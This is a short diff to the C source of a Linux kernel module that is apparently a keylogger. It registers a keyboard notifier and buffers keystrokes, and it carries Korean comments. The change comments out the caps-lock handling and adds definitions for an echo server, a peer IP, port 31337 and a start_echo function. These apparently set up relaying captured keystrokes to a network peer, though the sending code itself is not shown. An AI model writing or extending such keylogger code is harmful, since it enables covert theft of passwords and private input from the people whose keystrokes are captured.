@@ -5,14 +5,17 @@
 #include <linux/types.h>
 #include <linux/module.h>
 #include <linux/keyboard.h>
-#include <linux/kd.h>//for keyboard ioctl
-#include <sys/ioctl.h>//for caps lock
+// #include <linux/kd.h>//for keyboard ioctl
+// #include <asm/ioctl.h>//for caps lock
 #include <linux/input.h>
 
 #define KLG_MAJOR   60 //전처리
 #define BUFF_LENGTH 1024
 #define FIRST_CD    KEY_1 //'1'
 #define LAST_CD     KEY_SLASH //'/'
+#define ECHO_SERVER	"/tmp/echo_server"
+#define PEER_IP		"127.0.0.1"
+#define PORT		"31337"
 
 char buffer[BUFF_LENGTH+1]; //버퍼 배열 선언
 char* bptr = buffer; //버퍼 배열의 시작 주소를 bptr변수에 저장한다.
@@ -43,8 +46,9 @@ int klg_open(struct inode *inode, struct file *filp); //klg_open 함수 선언
 ssize_t klg_read(struct file *filp, char *buf, size_t count, loff_t *f_pos); //klg_read함수 선언
 void klg_exit(void); //klg_exit함수 선언
 int klg_init(void); //klg_init함수 선언
-int caps_lock_status(void);
+// int caps_lock_status(void);
 int kbd_notifier(struct notifier_block* nblock, unsigned long code, void* param); //kbd_notifier함수 선언
+static int start_echo(void);
 
 struct file_operations klg_fops = { //함수들을 정의하는 구조체
   .owner = THIS_MODULE,             //read, open에 대해 klg_read, klg_open함수와 연결됨
